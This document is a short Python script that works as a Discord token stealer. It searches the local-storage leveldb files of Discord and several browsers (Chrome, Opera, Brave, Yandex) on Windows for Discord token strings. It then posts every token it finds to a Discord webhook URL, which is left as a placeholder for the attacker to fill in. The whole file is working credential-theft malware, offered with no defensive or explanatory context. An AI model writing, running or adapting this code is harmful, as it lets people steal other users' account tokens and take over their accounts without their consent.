import os
import json
import requests # type: ignore
from re import findall

WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL'

def find_token():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }
    tokens = []
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        for file in os.listdir(path + '\\Local Storage\\leveldb'):
            if not file.endswith('.ldb') and not file.endswith('.log'):
                continue
            try:
                with open(f"{path}\\Local Storage\\leveldb\\{file}", 'r', errors='ignore') as f:
                    for line in f.readlines():
                        line = line.strip()
                        if line:
                            for token in findall(r"dQw4w9WgXcQ:[^\"]*", line):
                                tokens.append(token)
            except:
                pass
    return tokens

def send_to_webhook(tokens):
    data = {
        "content": "Tokens: " + '\n'.join(tokens)
    }
    requests.post(WEBHOOK_URL, json=data)

if __name__ == '__main__':
    tokens = find_token()
    if tokens:
        send_to_webhook(tokens)
